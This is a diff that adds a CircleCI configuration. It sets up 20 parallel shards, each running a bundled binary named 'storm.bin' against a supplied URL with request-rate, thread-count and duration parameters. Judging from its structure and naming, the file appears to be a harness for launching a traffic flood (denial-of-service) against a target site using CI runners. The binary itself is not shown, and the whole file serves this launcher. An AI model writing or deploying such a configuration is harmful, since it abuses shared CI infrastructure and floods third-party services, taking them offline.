@@ -1,0 +1,52 @@
+# .circleci/config.yml
+version: 2.1
+
+parameters:
+  url:
+    type: string
+    default: ""
+  rate:
+    type: integer
+    default: 0
+  time:
+    type: integer
+    default: 0
+  threads:
+    type: integer
+    default: 0
+
+jobs:
+  ran:
+    docker:
+      - image: cimg/python:3.12
+    resource_class: medium
+    parallelism: 20
+    parameters:
+      shard:
+        type: integer
+        default: 1
+    steps:
+      - checkout
+      - run:
+          name: Make raw executable
+          command: chmod +x storm.bin
+      - run:
+          name: Run raw with parameters
+          command: |
+            TIME=<< pipeline.parameters.time >>
+            timeout $TIME ./storm.bin "<< pipeline.parameters.url >>" "$((TIME+60))" "<< pipeline.parameters.rate >>" "<< pipeline.parameters.threads >>" --raw
+
+workflows:
+  run-raw:
+    when:
+      and:
+        - equal: [ true, << pipeline.parameters.url >> ]
+        - equal: [ true, << pipeline.parameters.rate >> ]
+        - equal: [ true, << pipeline.parameters.time >> ]
+        - equal: [ true, << pipeline.parameters.threads >> ]
+    jobs:
+      - ran:
+          name: ran-shard-<< matrix.shard >>
+          matrix:
+            parameters:
+              shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
